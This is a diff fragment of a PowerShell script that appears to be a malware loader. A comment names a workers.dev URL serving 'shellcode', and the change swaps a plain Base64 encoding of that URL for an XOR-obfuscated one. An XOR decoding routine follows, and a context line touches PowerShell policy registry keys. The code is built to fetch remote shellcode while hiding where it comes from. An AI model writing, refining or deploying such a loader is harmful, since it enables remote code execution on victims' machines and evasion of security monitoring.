@@ -44,7 +44,7 @@ $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Mod
 #    The raw URL: https://aged-mountain-614b.natalia-kush82.workers.dev/shellcode
 #    XORed with 7, then Base64 encoded.
 # ============================================================
-$xorEncodedB64 = "aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl"
+$xorEncodedB64 = "b3Nzd3Q9KChmYGJjKmpocmlzZm5pKjE2M2UpaWZzZmtuZipscnRvPzUpcGh1bGJ1dCljYnEodG9ia2tkaGNi"
 function Invoke-XorDecode {
     param([byte[]]$EncodedBytes, [int]$Key = 7)
     $decoded = @()
